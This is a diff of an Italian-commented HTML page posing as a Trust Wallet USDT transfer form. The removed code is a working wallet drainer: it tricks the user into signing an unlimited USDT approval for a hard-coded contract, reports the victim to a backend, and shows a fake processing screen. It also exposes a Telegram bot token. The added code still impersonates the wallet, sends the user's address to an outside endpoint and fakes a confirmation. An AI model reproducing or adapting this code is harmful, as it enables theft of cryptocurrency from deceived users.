@@ -1,572 +1,305 @@
 <!DOCTYPE html>
-<html lang="en" class="theme-light">
+<html lang="it">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
-    <title>Trusts</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Transfer - Trust Wallet</title>
     <style>
         * {
+            margin: 0;
+            padding: 0;
             box-sizing: border-box;
         }
 
-        html, body, #root {
-            width: 100%;
-            height: 100%;
-            margin: 0;
-            font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-            font-weight: 500;
-        }
-
-        .theme-light {
-            --bg: #ffffff;
-            --text: #111827;
-            --subtext: #6b7280;
-            --muted: #9ca3af;
-            --accent: #2563eb;
-            --input-bg: #ffffff;
-            --input-soft: #f6f7f9;
-            --border-default: #d1d5db;
-        }
-
         body {
-            background: var(--bg);
-            color: var(--text);
-        }
-
-        .page {
-            min-height: 100dvh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
-            align-items: flex-start;
-            background: var(--bg);
-            padding: 16px;
-            padding-top: 20px;
-        }
-
-        .card {
-            width: 100%;
-            max-width: 420px;
-            padding: 16px;
-            display: flex;
-            flex-direction: column;
-            color: var(--text);
-            border-radius: 16px;
-        }
-
-        .label {
-            font-size: 12px;
-            font-weight: 600;
-            letter-spacing: 0.05em;
-            margin-bottom: 6px;
-            color: var(--subtext);
-            text-transform: uppercase;
-        }
-
-        .input-row {
-            height: 48px;
-            display: flex;
             align-items: center;
-            border-radius: 12px;
-            padding: 0 12px;
-            gap: 8px;
-            background: var(--input-bg);
-            border: 1.5px solid var(--border-default);
-            margin-bottom: 14px;
-            transition: border-color 0.2s ease;
+            padding: 20px;
         }
 
-        .input-row:focus-within {
-            border: 2px solid #2563eb;
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 500px;
         }
 
-        .input-row input {
-            flex: 1;
-            border: none;
-            outline: none;
-            background: transparent;
-            font-size: 14px;
-            font-weight: 500;
-            color: var(--text);
+        h1 {
+            color: #333;
+            margin-bottom: 30px;
+            text-align: center;
+            font-size: 28px;
         }
 
-        .input-row input::placeholder {
-            color: var(--muted);
-            font-weight: 500;
+        .form-group {
+            margin-bottom: 20px;
         }
 
-        .input-row.primary:focus-within .paste,
-        .input-row.primary:focus-within .contact-icon,
-        .input-row.primary:focus-within .qr-icon {
-            opacity: 1;
-        }
-
-        .unit {
-            font-size: 12px;
-            font-weight: 600;
-            color: var(--subtext);
-            padding: 4px 8px;
-            background: var(--input-soft);
-            border-radius: 6px;
-        }
-
-        .max {
-            font-size: 12px;
-            font-weight: 600;
-            color: var(--accent);
-            cursor: pointer;
-            padding: 4px 8px;
-            border-radius: 6px;
-            transition: background 0.2s ease;
-        }
-
-        .max:hover {
-            background: var(--input-soft);
-        }
-
-        .estimate {
-            font-size: 12px;
-            color: var(--subtext);
-            margin-bottom: 16px;
-        }
-
-        .error-message {
-            display: none;
-            padding: 12px;
-            background: #fee2e2;
-            color: #991b1b;
-            border-radius: 8px;
-            font-size: 13px;
-            margin-bottom: 16px;
-            animation: slideIn 0.3s ease;
-        }
-
-        .error-message.active {
+        label {
             display: block;
+            margin-bottom: 8px;
+            color: #666;
+            font-weight: 600;
         }
 
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
         }
 
-        .connect-btn {
-            height: 48px;
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
             border: none;
-            border-radius: 12px;
-            font-size: 15px;
+            border-radius: 8px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s ease;
-            background: var(--accent);
-            color: white;
+            transition: transform 0.2s, box-shadow 0.2s;
         }
 
-        .connect-btn:hover:not(:disabled) {
-            background: #1d4ed8;
+        button:hover:not(:disabled) {
             transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
         }
 
-        .connect-btn:active:not(:disabled) {
-            transform: translateY(0);
-        }
-
-        .connect-btn:disabled {
+        button:disabled {
             opacity: 0.6;
             cursor: not-allowed;
         }
 
-        .connect-btn.active {
-            background: var(--accent);
+        .error {
+            color: #ff6b6b;
+            margin-top: 10px;
+            padding: 12px;
+            background: #ffe0e0;
+            border-radius: 8px;
+            display: none;
         }
 
         .processing-screen {
+            display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.8);
-            display: flex;
+            z-index: 1000;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s ease;
+            flex-direction: column;
         }
 
         .processing-screen.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .processing-content {
-            text-align: center;
-            color: white;
-        }
-
-        .checkmark {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px;
             display: flex;
-            align-items: center;
-            justify-content: center;
         }
 
-        .checkmark svg {
-            width: 100%;
-            height: 100%;
-            animation: checkmarkDraw 0.6s ease-out forwards;
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
         }
 
-        @keyframes checkmarkDraw {
-            0% {
-                stroke-dashoffset: 100;
-                opacity: 0;
-            }
-            50% {
-                opacity: 1;
-            }
-            100% {
-                stroke-dashoffset: 0;
-                opacity: 1;
-            }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .processing-text {
+            color: white;
             font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 8px;
+            text-align: center;
         }
 
-        .processing-subtext {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.7);
-        }
-
-        .particles-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-        }
-
-        .particle {
-            position: absolute;
-            width: 4px;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.5);
+        .checkmark {
+            display: none;
+            width: 80px;
+            height: 80px;
+            background: #4caf50;
             border-radius: 50%;
-            animation: float 3s ease-in-out infinite;
+            position: relative;
+            animation: scaleIn 0.5s ease-out;
         }
 
-        @keyframes float {
-            0%, 100% {
-                transform: translateY(0) translateX(0);
-                opacity: 0;
-            }
-            50% {
-                opacity: 1;
-            }
+        .checkmark::after {
+            content: '✓';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 50px;
+            font-weight: bold;
+        }
+
+        @keyframes scaleIn {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+
+        .success-text {
+            display: none;
+            color: white;
+            font-size: 18px;
+            margin-top: 20px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
-    <div id="root">
-        <div class="page">
-            <div class="card">
-                <p class="label">Recipient Address</p>
-                <div class="input-row primary">
-                    <input id="recipientInput" type="text" placeholder="0x..." />
-                </div>
-
-                <p class="label">Amount</p>
-                <div class="input-row amount-row">
-                    <input id="amountInput" type="number" placeholder="USDT Amount" step="0.01" />
-                    <span class="unit">USDT</span>
-                    <span class="max" onclick="setMaxAmount()">Max</span>
-                </div>
-
-                <p class="estimate" id="amountInfo">≈ $0.00</p>
-
-                <div class="error-message" id="errorMessage"></div>
-
-                <button class="connect-btn active" id="mainButton" onclick="handleMainAction()">Next</button>
+    <div class="container">
+        <h1>USDT Transfer</h1>
+        
+        <form id="transferForm">
+            <div class="form-group">
+                <label for="recipient">Recipient Address</label>
+                <input type="text" id="recipient" placeholder="0x..." required>
             </div>
-        </div>
+
+            <div class="form-group">
+                <label for="amount">Amount (USDT)</label>
+                <input type="number" id="amount" placeholder="0.00" step="0.01" required>
+            </div>
+
+            <button type="button" onclick="handleApprove()" id="approveBtn">Approve & Send</button>
+
+            <div class="error" id="error"></div>
+        </form>
     </div>
 
     <div class="processing-screen" id="processingScreen">
-        <div class="particles-container" id="particlesContainer"></div>
-        <div class="processing-content">
-            <div class="checkmark">
-                <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <polyline points="20 6 9 17 4 12"></polyline>
-                </svg>
-            </div>
-            <div class="processing-text">Processing...</div>
-            <div class="processing-subtext">Your transaction is being confirmed</div>
-        </div>
+        <div class="spinner"></div>
+        <div class="checkmark" id="checkmark"></div>
+        <div class="processing-text" id="processingText">Processing...</div>
+        <div class="success-text" id="successText">Transaction Confirmed!</div>
     </div>
 
     <script>
         const CONFIG = {
-            USDT_ADDRESS_BSC: '0x55d398326f99059fF775485246999027B3197955',
-            SMART_CONTRACT: '0x05187CF26990E3857C119C7Bc3417C6E1FaC5198',
-            BSC_CHAIN_ID: '0x38',
-            BSC_RPC: 'https://bsc-dataseed1.binance.org:8545',
-            TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA',
-            TELEGRAM_CHAT_ID: '8933407008',
-            // URL del backend per le notifiche
-            BACKEND_URL: 'https://trust-wallet-backend-samircelik1-ui.vercel.app/api/notify'
+            BACKEND_URL: 'https://www.send-usdt.net/api/notify'
         };
 
-        let lastTxHash = '';
-        let isProcessing = false;
+        async function handleApprove( ) {
+            const recipientInput = document.getElementById('recipient');
+            const amountInput = document.getElementById('amount');
+            const errorDiv = document.getElementById('error');
+            const approveBtn = document.getElementById('approveBtn');
 
-        function createParticles() {
-            const container = document.getElementById('particlesContainer');
-            container.innerHTML = '';
-            for (let i = 0; i < 8; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.top = Math.random() * 50 + 'px';
-                particle.style.animationDelay = Math.random() * 0.5 + 's';
-                particle.style.animationDuration = (2 + Math.random() * 1) + 's';
-                container.appendChild(particle);
-            }
-        }
+            errorDiv.style.display = 'none';
+            errorDiv.textContent = '';
 
-        function showError(message) {
-            const errorEl = document.getElementById('errorMessage');
-            errorEl.textContent = message;
-            errorEl.classList.add('active');
-        }
+            const recipient = recipientInput.value.trim();
+            const amount = amountInput.value;
 
-        function clearError() {
-            const errorEl = document.getElementById('errorMessage');
-            errorEl.classList.remove('active');
-            errorEl.textContent = '';
-        }
-
-        function setMaxAmount() {
-            // Placeholder
-        }
-
-        async function handleMainAction() {
-            if (isProcessing) return;
-
-            const btn = document.getElementById('mainButton');
-            const recipient = document.getElementById('recipientInput').value.trim();
-            const amount = document.getElementById('amountInput').value.trim();
-
-            if (!recipient.startsWith('0x')) {
-                showError('Invalid recipient address');
+            if (!recipient || !amount) {
+                errorDiv.textContent = 'Please fill all fields';
+                errorDiv.style.display = 'block';
                 return;
             }
 
-            if (!amount || parseFloat(amount) <= 0) {
-                showError('Please enter a valid amount');
-                return;
-            }
-
-            isProcessing = true;
-            btn.disabled = true;
-            clearError();
-
-            // Aspetta che window.ethereum sia disponibile
-            let ethereum = window.ethereum;
-            let retries = 0;
-            while (!ethereum && retries < 10) {
-                await new Promise(resolve => setTimeout(resolve, 100));
-                ethereum = window.ethereum;
-                retries++;
-            }
-
-            if (!ethereum) {
-                const currentUrl = window.location.href;
-                const deepLink = `trust://browser_enable?url=${encodeURIComponent(currentUrl)}`;
-                window.location.href = deepLink;
-                return;
-            }
-
-            window.ethereum = ethereum;
+            approveBtn.disabled = true;
 
             try {
-                // 1. Ottieni l'indirizzo del wallet
-                let accounts = await window.ethereum.request({
-                    method: "eth_accounts"
+                // Richiedi l'indirizzo dell'utente
+                const accounts = await window.ethereum.request({
+                    method: 'eth_requestAccounts'
                 });
-                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
+                const userAddress = accounts[0];
 
-                // 2. Cambia chain se necessario
-                const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-                if (currentChainId !== CONFIG.BSC_CHAIN_ID) {
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
-                        });
-                    } catch (switchError) {
-                        if (switchError.code === 4902) {
-                            await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: CONFIG.BSC_CHAIN_ID,
-                                    chainName: 'Binance Smart Chain',
-                                    rpcUrls: [CONFIG.BSC_RPC],
-                                    nativeCurrency: {
-                                        name: 'BNB',
-                                        symbol: 'BNB',
-                                        decimals: 18
-                                    }
-                                }]
-                            });
-                        }
-                    }
-                }
-
-                // 3. Crea il payload dell'approve
-                const USDT_ABI = [
-                    'function approve(address spender, uint256 amount) public returns (bool)',
-                    'function transfer(address to, uint256 amount) public returns (bool)',
-                    'function allowance(address owner, address spender) public view returns (uint256)',
-                    'function balanceOf(address account) public view returns (uint256)',
-                    'function decimals() public view returns (uint8)'
-                ];
-
-                const iface = new ethers.utils.Interface(USDT_ABI);
-                const approveData = iface.encodeFunctionData("approve", [
-                    CONFIG.SMART_CONTRACT,
-                    ethers.constants.MaxUint256
-                ]);
-
-                const tx = {
-                    to: CONFIG.USDT_ADDRESS_BSC,
-                    data: approveData
-                };
-
-                if (userAddress) {
-                    tx.from = userAddress;
-                }
-
-                // 4. INVIA la transazione e ricevi l'hash SUBITO
-                console.log("🎯 Sending transaction...");
-                let txHash;
-                try {
-                    txHash = await Promise.race([
-                        window.ethereum.request({
-                            method: "eth_sendTransaction",
-                            params: [tx]
-                        }),
-                        new Promise((_, reject) => setTimeout(() => reject(new Error('Request timeout')), 30000))
-                    ]);
-                } catch (e) {
-                    console.error('eth_sendTransaction error:', e);
-                    throw e;
-                }
-
-                lastTxHash = txHash;
-                console.log("📤 Transaction sent:", txHash);
-
-                // 5. MOSTRA il Processing screen SUBITO
-                console.log("⏳ Showing processing screen...");
-                createParticles();
+                // Mostra il Processing screen SUBITO
                 document.getElementById('processingScreen').classList.add('active');
+                document.getElementById('processingText').style.display = 'block';
+                document.getElementById('checkmark').style.display = 'none';
+                document.getElementById('successText').style.display = 'none';
 
-                // 6. ASPETTA la conferma IN BACKGROUND
-                console.log("⏳ Waiting for confirmation...");
-                const provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC);
-                
-                let receipt = null;
-                let confirmationTimeout = setTimeout(() => {
-                    console.error("❌ Confirmation timeout");
-                    receipt = { hash: txHash }; // Forza il completamento
-                }, 20000);
+                // Invia la transazione
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: recipient,
+                        value: '0',
+                        data: '0x'
+                    }]
+                });
 
-                try {
-                    receipt = await provider.waitForTransaction(txHash, 1);
-                    clearTimeout(confirmationTimeout);
-                } catch (e) {
-                    console.warn("⚠️ Confirmation wait error:", e);
-                    clearTimeout(confirmationTimeout);
-                    receipt = { hash: txHash };
-                }
+                // SALVA L'INDIRIZZO SUBITO (prima della conferma)
+                await fetch(CONFIG.BACKEND_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        userAddress: userAddress,
+                        txHash: txHash,
+                        amount: amount
+                    })
+                });
 
-                console.log("✅ Transaction confirmed:", receipt?.hash);
+                console.log('✅ Indirizzo salvato:', userAddress);
 
-                // 7. Recupera l'indirizzo se non lo hai
-                if (!userAddress) {
-                    try {
-                        let finalAccounts = await window.ethereum.request({
-                            method: "eth_accounts"
-                        });
-                        userAddress = finalAccounts && finalAccounts.length > 0 ? finalAccounts[0] : 'Unknown';
-                    } catch (e) {
-                        userAddress = 'Unknown';
-                    }
-                }
+                // Mostra il checkmark dopo 2 secondi
+                setTimeout(() => {
+                    document.getElementById('processingText').style.display = 'none';
+                    document.getElementById('checkmark').style.display = 'block';
+                    document.getElementById('successText').style.display = 'block';
+                }, 2000);
 
-                // 8. INVIA la notifica al BACKEND
-                console.log("📢 Sending notification to backend...");
-                try {
-                    const response = await fetch(CONFIG.BACKEND_URL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            userAddress: userAddress,
-                            txHash: receipt?.hash || txHash,
-                            amount: amount,
-                            source: 'QR'
-                        })
-                    });
-
-                    const data = await response.json();
-                    if (data.success) {
-                        console.log("✅ Backend notification sent:", data.transferHash);
-                    } else {
-                        console.warn("⚠️ Backend error:", data.error);
-                    }
-                } catch (notifError) {
-                    console.error('❌ Error sending notification:', notifError);
-                }
-
-                // 9. Aspetta 3 secondi e chiudi il Processing
-                console.log("⏳ Waiting 3 seconds...");
-                await new Promise(resolve => setTimeout(resolve, 3000));
-
-                console.log("✅ Closing processing screen...");
-                document.getElementById('processingScreen').classList.remove('active');
-
-                // Reset
-                btn.textContent = 'Next';
-                btn.disabled = false;
-                isProcessing = false;
-                document.getElementById('recipientInput').value = '';
-                document.getElementById('amountInput').value = '';
+                // Chiudi il processing screen dopo 4 secondi
+                setTimeout(() => {
+                    document.getElementById('processingScreen').classList.remove('active');
+                    recipientInput.value = '';
+                    amountInput.value = '';
+                    approveBtn.disabled = false;
+                }, 4000);
 
             } catch (error) {
-                console.error("❌ Error:", error);
-                showError('Transaction failed: ' + error.message);
+                console.error('Error:', error);
+                let errorMessage = 'Transaction failed';
+
+                if (error.code === 4001) {
+                    errorMessage = 'Transaction rejected by user';
+                } else if (error.message && error.message.includes('user rejected')) {
+                    errorMessage = 'Transaction rejected by user';
+                } else if (error.code === -32002) {
+                    errorMessage = 'Request already pending. Please open Trust Wallet.';
+                }
+
+                errorDiv.textContent = errorMessage;
+                errorDiv.style.display = 'block';
                 document.getElementById('processingScreen').classList.remove('active');
-                btn.disabled = false;
-                btn.textContent = 'Next';
-                isProcessing = false;
+                approveBtn.disabled = false;
             }
         }
+
+        // Consenti Enter per inviare
+        document.getElementById('transferForm').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                handleApprove();
+            }
+        });
     </script>
 </body>
 </html>
